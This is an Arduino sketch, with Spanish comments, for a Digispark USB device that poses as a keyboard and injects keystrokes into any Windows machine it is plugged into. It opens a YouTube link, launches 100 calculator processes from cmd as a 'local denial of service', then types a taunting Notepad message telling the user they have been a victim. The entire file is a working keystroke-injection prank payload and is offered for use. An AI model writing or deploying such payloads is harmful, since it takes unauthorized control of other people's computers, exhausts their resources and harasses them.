#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); // Configura el LED interno
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);

  // 1. Abrir el video "sorpresa"
  DigiKeyboard.sendKeyStroke(0x15, 0x08); // Win + R
  DigiKeyboard.delay(600);
  DigiKeyboard.println(F("https://youtu.be/bgenxqy0NQ0?si=5By1gFNScuCYBaLg")); 
  DigiKeyboard.delay(4000); // Damos tiempo a que cargue el navegador

  // 2. LA BOMBA DE 100 CALCULADORAS
  DigiKeyboard.sendKeyStroke(0x15, 0x08); // Win + R
  DigiKeyboard.delay(600);
  
  // Abrimos CMD de forma rápida
  DigiKeyboard.println(F("cmd"));
  DigiKeyboard.delay(1000);
  
  // Comando para abrir exactamente 100 calculadoras. 
  // En teclados MX, el comando 'for' es seguro porque no usa simbolos conflictivos.
  DigiKeyboard.println(F("for /l %i in (1,1,100) do start calc"));
  DigiKeyboard.delay(1000);
  
  // Cerramos el CMD para limpiar la pantalla
  DigiKeyboard.println(F("exit")); 
  DigiKeyboard.delay(500);

  // 3. MENSAJE FINAL DE IMPACTO
  DigiKeyboard.sendKeyStroke(0x15, 0x08); // Win + R
  DigiKeyboard.delay(600);
  DigiKeyboard.println(F("notepad"));
  DigiKeyboard.delay(1200);
  
  DigiKeyboard.println(F("SISTEMA POSEIDO POR TODD"));
  DigiKeyboard.println(F("========================"));
  DigiKeyboard.println(F("Has sido una victima."));
  DigiKeyboard.println(F("Se han ejecutado 100 procesos de calculadora."));
  DigiKeyboard.println(F("Esto es una prueba de denegacion de servicio local."));
  DigiKeyboard.println(F("No ententes cerrarlas una por una..."));
  DigiKeyboard.println(F("Saludos!"));

  // Feedback visual final: El LED parpadea muy rápido
  for(;;) {
    digitalWrite(1, HIGH); delay(50);
    digitalWrite(1, LOW); delay(50);
  }
}